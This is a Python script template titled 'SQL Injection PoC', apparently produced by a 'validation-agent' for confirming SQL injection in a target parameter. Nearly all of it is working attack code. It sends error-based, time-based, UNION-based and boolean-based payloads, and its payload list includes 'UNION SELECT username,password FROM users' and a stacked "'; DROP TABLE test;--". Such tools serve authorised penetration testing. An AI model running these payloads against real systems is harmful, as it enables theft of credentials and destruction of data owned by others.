#!/usr/bin/env python3
"""
SQL Injection PoC
==================
Target: {{TARGET_URL}}
Parameter: {{PARAMETER}}
Location: {{PARAMETER_LOCATION}}
Vuln ID: {{VULN_ID}}

Generated by: validation-agent
Generated at: {{GENERATED_AT}}

Usage:
    python poc_sqli_{{VULN_ID}}.py [--verbose] [--proxy http://127.0.0.1:8080]

Requirements:
    pip install requests
"""

import argparse
import json
import sys
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Error: requests library required. Install with: pip install requests")
    sys.exit(1)


class InjectionType(Enum):
    ERROR_BASED = "error_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    STACKED = "stacked_queries"


@dataclass
class TestResult:
    injection_type: InjectionType
    payload: str
    success: bool
    evidence: str
    response_time: float
    status_code: int


class SQLiPoC:
    """SQL Injection Proof of Concept"""

    def __init__(
        self,
        target_url: str,
        parameter: str,
        param_location: str = "body",
        method: str = "POST",
        content_type: str = "application/json",
        headers: Optional[Dict] = None,
        cookies: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        verbose: bool = False
    ):
        self.target_url = target_url
        self.parameter = parameter
        self.param_location = param_location
        self.method = method.upper()
        self.content_type = content_type
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.verbose = verbose
        self.results: List[TestResult] = []

        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.verify = False

        # Payloads for different injection types
        self.payloads = {
            InjectionType.ERROR_BASED: [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "1' AND '1'='1",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            InjectionType.TIME_BASED: [
                "' OR SLEEP(5)--",
                "\" OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
                "1' AND SLEEP(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            InjectionType.UNION_BASED: [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password FROM users--",
                "0 UNION SELECT 1,2,3--",
            ],
            InjectionType.BOOLEAN_BASED: [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND 1=1--",
                "1' AND 1=2--",
            ],
            InjectionType.STACKED: [
                "'; SELECT SLEEP(5);--",
                "'; DROP TABLE test;--",
                "1; SELECT * FROM users;--",
            ]
        }

        # Error patterns indicating SQL injection
        self.error_patterns = [
            "sql syntax",
            "mysql_",
            "mysqli_",
            "pg_query",
            "sqlite_",
            "ORA-",
            "SQL Server",
            "ODBC",
            "syntax error",
            "unclosed quotation",
            "quoted string not properly terminated",
            "Microsoft OLE DB Provider",
            "javax.persistence",
            "Hibernate",
        ]

    def log(self, message: str):
        if self.verbose:
            print(f"[*] {message}")

    def make_request(self, payload: str) -> Tuple[requests.Response, float]:
        """Make request with payload"""
        start_time = time.time()

        if self.param_location == "body":
            if self.content_type == "application/json":
                data = json.dumps({self.parameter: payload})
                headers = {**self.headers, "Content-Type": "application/json"}
                response = self.session.request(
                    self.method,
                    self.target_url,
                    data=data,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout
                )
            else:
                data = {self.parameter: payload}
                response = self.session.request(
                    self.method,
                    self.target_url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    timeout=self.timeout
                )
        elif self.param_location == "query":
            params = {self.parameter: payload}
            response = self.session.request(
                self.method,
                self.target_url,
                params=params,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout
            )
        elif self.param_location == "path":
            url = self.target_url.replace(f"{{{self.parameter}}}", payload)
            response = self.session.request(
                self.method,
                url,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout
            )
        else:
            raise ValueError(f"Unknown parameter location: {self.param_location}")

        elapsed = time.time() - start_time
        return response, elapsed

    def check_error_based(self, response: requests.Response) -> Optional[str]:
        """Check for SQL error messages in response"""
        response_text = response.text.lower()
        for pattern in self.error_patterns:
            if pattern.lower() in response_text:
                return pattern
        return None

    def test_error_based(self) -> List[TestResult]:
        """Test for error-based SQL injection"""
        self.log("Testing error-based injection...")
        results = []

        for payload in self.payloads[InjectionType.ERROR_BASED]:
            try:
                response, elapsed = self.make_request(payload)
                error_found = self.check_error_based(response)

                success = error_found is not None
                evidence = f"Error pattern found: {error_found}" if success else "No SQL error detected"

                result = TestResult(
                    injection_type=InjectionType.ERROR_BASED,
                    payload=payload,
                    success=success,
                    evidence=evidence,
                    response_time=elapsed,
                    status_code=response.status_code
                )
                results.append(result)

                if success:
                    self.log(f"  [+] Vulnerable! Payload: {payload}")
                    self.log(f"      Evidence: {evidence}")

            except Exception as e:
                self.log(f"  [-] Error with payload '{payload}': {e}")

        return results

    def test_time_based(self, delay_threshold: float = 4.0) -> List[TestResult]:
        """Test for time-based blind SQL injection"""
        self.log("Testing time-based injection...")
        results = []

        # First, get baseline response time
        try:
            _, baseline_time = self.make_request("normal_value")
            self.log(f"  Baseline response time: {baseline_time:.2f}s")
        except Exception:
            baseline_time = 1.0

        for payload in self.payloads[InjectionType.TIME_BASED]:
            try:
                response, elapsed = self.make_request(payload)

                # Check if response was significantly delayed
                success = elapsed > (baseline_time + delay_threshold)
                evidence = f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)"

                result = TestResult(
                    injection_type=InjectionType.TIME_BASED,
                    payload=payload,
                    success=success,
                    evidence=evidence,
                    response_time=elapsed,
                    status_code=response.status_code
                )
                results.append(result)

                if success:
                    self.log(f"  [+] Vulnerable! Payload: {payload}")
                    self.log(f"      Evidence: {evidence}")

            except requests.Timeout:
                # Timeout might indicate successful injection
                result = TestResult(
                    injection_type=InjectionType.TIME_BASED,
                    payload=payload,
                    success=True,
                    evidence="Request timed out (possible successful delay injection)",
                    response_time=self.timeout,
                    status_code=0
                )
                results.append(result)
                self.log(f"  [+] Possible vulnerability (timeout)! Payload: {payload}")

            except Exception as e:
                self.log(f"  [-] Error with payload '{payload}': {e}")

        return results

    def test_union_based(self) -> List[TestResult]:
        """Test for UNION-based SQL injection"""
        self.log("Testing UNION-based injection...")
        results = []

        for payload in self.payloads[InjectionType.UNION_BASED]:
            try:
                response, elapsed = self.make_request(payload)

                # Check for UNION artifacts in response
                success = any([
                    "null" in response.text.lower() and "union" not in response.text.lower(),
                    response.text.count(",") > 5,  # Possible data dump
                    len(response.text) > 10000,  # Unusually large response
                ])

                evidence = f"Response length: {len(response.text)}"

                result = TestResult(
                    injection_type=InjectionType.UNION_BASED,
                    payload=payload,
                    success=success,
                    evidence=evidence,
                    response_time=elapsed,
                    status_code=response.status_code
                )
                results.append(result)

                if success:
                    self.log(f"  [+] Possible vulnerability! Payload: {payload}")

            except Exception as e:
                self.log(f"  [-] Error with payload '{payload}': {e}")

        return results

    def test_boolean_based(self) -> List[TestResult]:
        """Test for boolean-based blind SQL injection"""
        self.log("Testing boolean-based injection...")
        results = []

        # Get baseline responses for true/false conditions
        try:
            true_response, _ = self.make_request("' AND '1'='1")
            false_response, _ = self.make_request("' AND '1'='2")

            # Compare responses
            if true_response.text != false_response.text:
                success = True
                evidence = f"Different responses for true/false conditions (true: {len(true_response.text)}, false: {len(false_response.text)})"
            elif true_response.status_code != false_response.status_code:
                success = True
                evidence = f"Different status codes (true: {true_response.status_code}, false: {false_response.status_code})"
            else:
                success = False
                evidence = "No difference detected between true/false conditions"

            result = TestResult(
                injection_type=InjectionType.BOOLEAN_BASED,
                payload="' AND '1'='1 vs ' AND '1'='2",
                success=success,
                evidence=evidence,
                response_time=0,
                status_code=true_response.status_code
            )
            results.append(result)

            if success:
                self.log(f"  [+] Vulnerable! {evidence}")

        except Exception as e:
            self.log(f"  [-] Error testing boolean-based: {e}")

        return results

    def run_all_tests(self) -> Dict:
        """Run all SQL injection tests"""
        print(f"\n{'='*60}")
        print(f"SQL Injection PoC")
        print(f"Target: {self.target_url}")
        print(f"Parameter: {self.parameter} ({self.param_location})")
        print(f"{'='*60}\n")

        all_results = []

        # Run all test types
        all_results.extend(self.test_error_based())
        all_results.extend(self.test_time_based())
        all_results.extend(self.test_union_based())
        all_results.extend(self.test_boolean_based())

        self.results = all_results

        # Summarize results
        vulnerable_tests = [r for r in all_results if r.success]

        print(f"\n{'='*60}")
        print("RESULTS SUMMARY")
        print(f"{'='*60}")
        print(f"Total tests: {len(all_results)}")
        print(f"Successful injections: {len(vulnerable_tests)}")

        if vulnerable_tests:
            print(f"\n[!] TARGET IS VULNERABLE!")
            print(f"\nSuccessful payloads:")
            for r in vulnerable_tests:
                print(f"  - [{r.injection_type.value}] {r.payload}")
                print(f"    Evidence: {r.evidence}")
        else:
            print(f"\n[*] No vulnerabilities confirmed (may need manual verification)")

        return {
            "target": self.target_url,
            "parameter": self.parameter,
            "vulnerable": len(vulnerable_tests) > 0,
            "total_tests": len(all_results),
            "successful_tests": len(vulnerable_tests),
            "results": [
                {
                    "type": r.injection_type.value,
                    "payload": r.payload,
                    "success": r.success,
                    "evidence": r.evidence,
                    "response_time": r.response_time,
                    "status_code": r.status_code
                }
                for r in all_results
            ]
        }


def main():
    parser = argparse.ArgumentParser(description="SQL Injection PoC")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--proxy", type=str, help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--output", "-o", type=str, help="Output file for results (JSON)")
    args = parser.parse_args()

    # Configuration from template
    poc = SQLiPoC(
        target_url="{{TARGET_URL}}",
        parameter="{{PARAMETER}}",
        param_location="{{PARAMETER_LOCATION}}",
        method="{{METHOD}}",
        content_type="{{CONTENT_TYPE}}",
        proxy=args.proxy,
        verbose=args.verbose
    )

    results = poc.run_all_tests()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults saved to: {args.output}")

    # Exit code based on vulnerability status
    sys.exit(0 if results["vulnerable"] else 1)


if __name__ == "__main__":
    main()
